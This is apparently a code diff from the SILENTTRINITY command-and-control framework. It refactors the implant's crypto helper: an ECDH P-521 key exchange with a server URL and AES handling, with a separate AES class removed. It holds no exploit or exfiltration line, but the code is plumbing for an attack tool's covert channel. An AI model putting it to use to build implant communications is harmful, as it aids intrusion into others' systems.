@@ -1,6 +1,5 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.IO;
 using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
@@ -15,22 +14,21 @@ using Org.BouncyCastle.Crypto.Parameters;
 using Org.BouncyCastle.Math;
 using Org.BouncyCastle.Security;
 
-namespace SILENTTRINITY.Utilities
+namespace SILENTTRINITY.Utilities.Crypto
 {
-    public static class Crypto
+    public static class Base
     {
         public static byte[] KeyExchange(Uri url)
         {
             X9ECParameters x9EC = NistNamedCurves.GetByName("P-521");
-            ECDomainParameters ecDomain = new ECDomainParameters(x9EC.Curve, x9EC.G, x9EC.N, x9EC.H, x9EC.GetSeed());
+            ECDomainParameters ecDomain = new ECDomainParameters(x9EC.Curve, 
+                                        x9EC.G, x9EC.N, x9EC.H, x9EC.GetSeed());
             AsymmetricCipherKeyPair aliceKeyPair = GenerateKeyPair( ecDomain);
 
             ECPublicKeyParameters alicePublicKey = (ECPublicKeyParameters)aliceKeyPair.Public;
             ECPublicKeyParameters bobPublicKey = GetBobPublicKey(url, x9EC, alicePublicKey);
 
-            byte[] AESKey = GenerateAESKey(bobPublicKey, aliceKeyPair.Private);
-
-            return AESKey;
+            return GenerateAESKey(bobPublicKey, aliceKeyPair.Private);
         }
 
         static byte[] GenerateAESKey(ECPublicKeyParameters bobPublicKey, 
@@ -50,8 +48,8 @@ namespace SILENTTRINITY.Utilities
         }
 
         static ECPublicKeyParameters GetBobPublicKey(Uri url, 
-                                                            X9ECParameters x9EC,
-                                                            ECPublicKeyParameters alicePublicKey)
+                                                     X9ECParameters x9EC,
+                                                     ECPublicKeyParameters alicePublicKey)
         {
             KeyCoords bobCoords = GetBobCoords(url, alicePublicKey);
             var point = x9EC.Curve.CreatePoint(bobCoords.X, bobCoords.Y);
@@ -69,31 +67,25 @@ namespace SILENTTRINITY.Utilities
 
         static KeyCoords GetBobCoords(Uri url, ECPublicKeyParameters publicKey)
         {
-            string json = GetJsonString(publicKey);
+            string json = string.Format("{{\"x\": {0},\"y\": {1}}}",
+                    publicKey.Q.AffineXCoord.ToBigInteger(),
+                    publicKey.Q.AffineYCoord.ToBigInteger()
+                );
 
             string response = Encoding.UTF8.GetString(Http.Post(url, Encoding.UTF8.GetBytes(json)));
             response = response.Replace("\"", "'");
 
-            Regex r = new Regex(@"': (.+?) ");
-            var mcx = r.Matches(response);
+            var mcx = new Regex(@"': (.+?) ").Matches(response);
             BigInteger x = new BigInteger(mcx[0].Value.Replace("': ", "").Replace(", ", ""));
 
-            string mcy = response.Substring(response.LastIndexOf(": ", StringComparison.Ordinal) + 1).Replace("}","").Trim();
+            string mcy = response.Substring(response.LastIndexOf(": ", 
+                            StringComparison.Ordinal) + 1).Replace("}","").Trim();
             BigInteger y = new BigInteger(mcy);
 
             return new KeyCoords { 
                 X = x,
                 Y = y
             };
-        }
-
-        static string GetJsonString(ECPublicKeyParameters publicKeyParameters)
-        {
-            string publicKeyJsonTemplate = @"{'x': X_VALUE, 'y': Y_VALUE}";
-            string json = publicKeyJsonTemplate;
-            json = json.Replace("X_VALUE", publicKeyParameters.Q.AffineXCoord.ToBigInteger().ToString());
-            json = json.Replace("Y_VALUE", publicKeyParameters.Q.AffineYCoord.ToBigInteger().ToString());
-            return json;
         }
 
         public static byte[] Decrypt(byte[] key, byte[] data)
@@ -142,55 +134,6 @@ namespace SILENTTRINITY.Utilities
                 }
             }
             return blob.ToArray();
-        }
-    }
-
-    static class AES
-    {
-        public static byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
-        {
-            using (Aes aesAlg = Aes.Create())
-            {
-                aesAlg.Padding = PaddingMode.PKCS7;
-                aesAlg.KeySize = 256;
-                aesAlg.Key = key;
-                aesAlg.IV = iv;
-
-                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
-
-                using (MemoryStream decryptedData = new MemoryStream())
-                {
-                    using (CryptoStream cryptoStream = new CryptoStream(decryptedData, decryptor, CryptoStreamMode.Write))
-                    {
-                        cryptoStream.Write(data, 0, data.Length);
-                        cryptoStream.FlushFinalBlock();
-                        return decryptedData.ToArray();
-                    }
-                }
-            }
-        }
-
-        public static byte[] Encrypt(byte[] data, byte[] key, byte[] iv)
-        {
-            using (Aes aesAlg = Aes.Create())
-            {
-                aesAlg.Padding = PaddingMode.PKCS7;
-                aesAlg.KeySize = 256;
-                aesAlg.Key = key;
-                aesAlg.IV = iv;
-
-                ICryptoTransform decryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
-
-                using (MemoryStream encryptedData = new MemoryStream())
-                {
-                    using (CryptoStream cryptoStream = new CryptoStream(encryptedData, decryptor, CryptoStreamMode.Write))
-                    {
-                        cryptoStream.Write(data, 0, data.Length);
-                        cryptoStream.FlushFinalBlock();
-                        return encryptedData.ToArray();
-                    }
-                }
-            }
         }
     }
 
